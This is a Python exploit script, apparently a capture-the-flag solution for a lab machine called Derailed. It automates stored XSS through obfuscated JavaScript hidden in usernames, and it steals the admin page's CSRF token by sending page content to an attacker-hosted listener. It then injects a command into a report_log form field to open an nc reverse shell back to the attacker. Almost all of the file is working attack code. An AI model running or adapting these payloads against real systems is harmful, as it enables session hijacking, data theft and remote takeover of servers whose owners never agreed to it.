#!/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from bs4 import BeautifulSoup
import threading
import requests
import base64
import re

attacker_machine = input("Attacker IP: ")
port = input("Port: ")

if not attacker_machine or not port:
    print("Attacker IP and port are required. Exiting...")
    exit()

print(f"You will receive a reverse shell on port {port}\n")

session = requests.Session()
response = session.get("http://10.10.11.190:3000/register")
soup = BeautifulSoup(response.content, "html.parser")
authenticity_token_r1 = soup.find("input", {"name": "authenticity_token"}).get("value")

# You can use a proxy to understand what is going on by adding 'proxy=proxy' in the POST or GET request.
proxies = {
   'http': 'http://127.0.0.1:8080'
}

#------------------------Register User Part ------------------------

js_file = f"""
var url = "http://derailed.htb:3000/administration";
var coder = "http://{attacker_machine}:9191/hook";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {{
    if (xhr.readyState == XMLHttpRequest.DONE) {{
        fetch(coder + "?" + encodeURI(btoa(xhr.responseText)));
    }}
}};
xhr.open('GET', url, true);
xhr.send(null);
"""

# Encode file to character codes
character_codes = [str(ord(char)) for char in js_file]
character_codes = ", ".join(character_codes)

username = f"""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes}))">
"""
password = "anything"
register_data = {
    "authenticity_token": authenticity_token_r1,
    "user[username]": username,
    "user[password]": password,
    "user[password_confirmation]": password
}

register_response = session.post("http://10.10.11.190:3000/register", data=register_data)
if register_response.status_code == 200:
    print(f"{Fore.GREEN}User registration successful!{Style.RESET_ALL}")
else:
    print("User registration failed. Status code:", register_response.status_code)
    exit()

#------------------------Login User Part ------------------------

# Extract authenticity_token from login page
login_soup = BeautifulSoup(register_response.content, "html.parser")
login_authenticity_token = login_soup.find("input", {"name": "authenticity_token"}).get("value")

login_data = {
    "authenticity_token": login_authenticity_token,
    "session[username]": username,
    "session[password]": password,
    "button": ""
}
login_response = session.post("http://10.10.11.190:3000/login", data=login_data)
if login_response.status_code == 200:
    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n")

    # Get the _simple_rails_session cookie from session cookies
    cookies = session.cookies
    if "_simple_rails_session" in cookies:
        session_cookie = cookies["_simple_rails_session"]
        #Additionally, you can use the '_simple_rails_session' to log in as the user that created it.
        print(f"simple_rails_session user 1 ({Fore.RED}XSS for administrator contents{Style.RESET_ALL}):\n",session_cookie,"\n")
    else:
        print("Unable to retrieve _simple_rails_session cookie")
else:
    print("User 2 login failed. Status code:", login_response.status_code)
    exit()

#------------------------Create Clip Note Part ------------------------

# Extract authenticity_token from create page
create_soup = BeautifulSoup(login_response.content, "html.parser")
create_authenticity_token = create_soup.find("input", {"name": "authenticity_token"}).get("value")

# Create clipnote
clipnotes_data = {
    "authenticity_token": create_authenticity_token,
    "note[content]": "any clipnote",
    "button": ""
}
create_clipnote = session.post("http://10.10.11.190:3000/create", data=clipnotes_data)
match = re.search(r'<a href="/report/(\d+)" class="btn">', create_clipnote.text)
number = match.group(1)
display_clipnote = session.get(url=f"http://10.10.11.190:3000/{number}", data=clipnotes_data)
if create_clipnote.status_code == 200:
    print(f"{Fore.GREEN}Create clipnote successful!{Style.RESET_ALL}")
else:
    print("Create clipnote failed. Status code:", create_clipnote.status_code)

#------------------------Report Clipnote Part ------------------------

# Get a new valid authenticity_token
display_report = session.get(url=f"http://10.10.11.190:3000/report/{number}")
create_soup = BeautifulSoup(display_report.content, "html.parser")
report_authenticity_token = create_soup.find("input", {"name": "authenticity_token"}).get("value")

# Set the header as authenticity_token
headers = {"Referer": f"http://10.10.11.190:3000/report/{number}"}
report_to_admin_data = {
    "authenticity_token": report_authenticity_token,
    "report[reason]": "anything",
    "report[note_id]": number,
}
report_request = session.post(url="http://10.10.11.190:3000/report/", headers=headers, data=report_to_admin_data)
if report_request.status_code == 200:
    print(f"{Fore.GREEN}Report clipnote successful!{Style.RESET_ALL}")
else:
    print("Failed to create report to admin. Status code:", report_request.status_code)
    exit()

# Stealing page admin to retrieve authenticity_token of admin and report_log id 

class CustomRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        request = self.requestline
        start_index = request.find("/hook?") + len("/hook?")
        end_index = request.rfind("HTTP/1.1") - 1
        if start_index != -1 and end_index != -1:
            extracted_data = request[start_index:end_index]
            if extracted_data.startswith("PCFET"):
                # Decode the Base64 string
                decoded_data = base64.b64decode(extracted_data)
                # Convert bytes to string
                data = decoded_data.decode('utf-8')
                soup = BeautifulSoup(data, 'html.parser')
                input_tag = soup.find('input', {'name': 'authenticity_token'})
                authenticity_token = input_tag['value']
                report_log_input = soup.find('input', {'name': 'report_log'})
                report_log = report_log_input['value']
                self.server.authenticity_token = authenticity_token
                self.server.report_log = report_log
                self.server.stop_event.set()  # Set the event to stop the server

class StoppableHTTPServer(HTTPServer):
    def __init__(self, server_address, RequestHandlerClass):
        super().__init__(server_address, RequestHandlerClass)
        self.stop_event = threading.Event()

    def serve_forever(self):
        while not self.stop_event.is_set():
            self.handle_request()

# Create an HTTP server with the custom request handler
server_address = ('', 9191)
httpd = StoppableHTTPServer(server_address, CustomRequestHandler)

# Start the server in a separate thread
def run_server():
    print(f"Waiting for token admin and report_log ID ({Fore.RED}approximately 1 minute{Style.RESET_ALL})\n")
    httpd.serve_forever()

server_thread = threading.Thread(target=run_server)
server_thread.start()

# Wait until the data is received or the server stops
server_thread.join()

# Access the received data after the server stops
if hasattr(httpd, 'authenticity_token') and hasattr(httpd, 'report_log'):
    authenticity_token = httpd.authenticity_token
    report_log = httpd.report_log
    print("authenticity_token:", authenticity_token)
    print("report_log:", report_log)
    print("\n")
else:
    print("Data not received.")



#--------------------Reverse Shell----------------------
reverse_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_machine} {port} >/tmp/f"

js_CSRF_RCE = f"""
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {{
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="{authenticity_token}" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="{report_log}" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value = '|{reverse_shell}';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}}, 3000);
"""
session = requests.Session()
response = session.get("http://10.10.11.190:3000/register")
soup = BeautifulSoup(response.content, "html.parser")
authenticity_token_r2 = soup.find("input", {"name": "authenticity_token"}).get("value")


# Encode file to character codes
character_codes_2 = [str(ord(char)) for char in js_CSRF_RCE]
character_codes_2 = ", ".join(character_codes_2)

username_2 = f"""aaaaaaaaaasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes_2}))">
"""
register_data_2 = {
    "authenticity_token": authenticity_token_r2,
    "user[username]": username_2,
    "user[password]": password,
    "user[password_confirmation]": password
}

register_response_2 = session.post("http://10.10.11.190:3000/register", data=register_data_2)
if register_response_2.status_code == 200:
    print(f"{Fore.GREEN}User registration_ successful!{Style.RESET_ALL}")
else:
    print("User registration_2 failed. Status code:", register_response_2.status_code)
    exit()

login_soup_2 = BeautifulSoup(register_response_2.content, "html.parser")
login_authenticity_token = login_soup_2.find("input", {"name": "authenticity_token"}).get("value")

login_data_2 = {
    "authenticity_token": login_authenticity_token,
    "session[username]": username_2,
    "session[password]": password,
    "button": ""
}
login_response_2 = session.post("http://10.10.11.190:3000/login", data=login_data_2)
if login_response_2.status_code == 200:
    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n")

    # Get the _simple_rails_session cookie from session cookies
    cookies = session.cookies
    if "_simple_rails_session" in cookies:
        session_cookie = cookies["_simple_rails_session"]
        print(f"simple_rails_session user 2 ({Fore.RED}CSRF RCE{Style.RESET_ALL}):\n",session_cookie,"\n")
    else:
        print("Unable to retrieve _simple_rails_session user 2 cookie")
else:
    print("User 2 login failed. Status code:", login_response_2.status_code)
    exit()




#------------------------Create Clip Note Part ------------------------

# Extract authenticity_token from create page
create_soup = BeautifulSoup(login_response_2.content, "html.parser")
create_authenticity_token = create_soup.find("input", {"name": "authenticity_token"}).get("value")

# Create clipnote
clipnotes_data_2 = {
    "authenticity_token": create_authenticity_token,
    "note[content]": "any clipnote",
    "button": ""
}
create_clipnote = session.post("http://10.10.11.190:3000/create", data=clipnotes_data_2)
match = re.search(r'<a href="/report/(\d+)" class="btn">', create_clipnote.text)
number = match.group(1)
display_clipnote = session.get(url=f"http://10.10.11.190:3000/{number}", data=clipnotes_data_2)
if create_clipnote.status_code == 200:
    print(f"{Fore.GREEN}Create clipnote successful!{Style.RESET_ALL}")
else:
    print("Create clipnote failed. Status code:", create_clipnote.status_code)

#------------------------Report Clipnote Part ------------------------

# Get a new valid authenticity_token
display_report = session.get(url=f"http://10.10.11.190:3000/report/{number}")
create_soup = BeautifulSoup(display_report.content, "html.parser")
report_authenticity_token_2 = create_soup.find("input", {"name": "authenticity_token"}).get("value")

# Set the header as authenticity_token
headers = {"Referer": f"http://10.10.11.190:3000/report/{number}"}
report_to_admin_data_2 = {
    "authenticity_token": report_authenticity_token_2,
    "report[reason]": "anything",
    "report[note_id]": number,
}
report_request = session.post(url="http://10.10.11.190:3000/report/", headers=headers, data=report_to_admin_data_2)
if report_request.status_code == 200:
    print(f"{Fore.GREEN}Report clipnote successful!{Style.RESET_ALL}")
    print("\n")
    print(f"You will get a shell on port {port} after one minute({Fore.RED}Make sure you have already set it up).{Style.RESET_ALL}")
else:
    print("Failed to create report to admin. Status code:", report_request.status_code)
    exit()
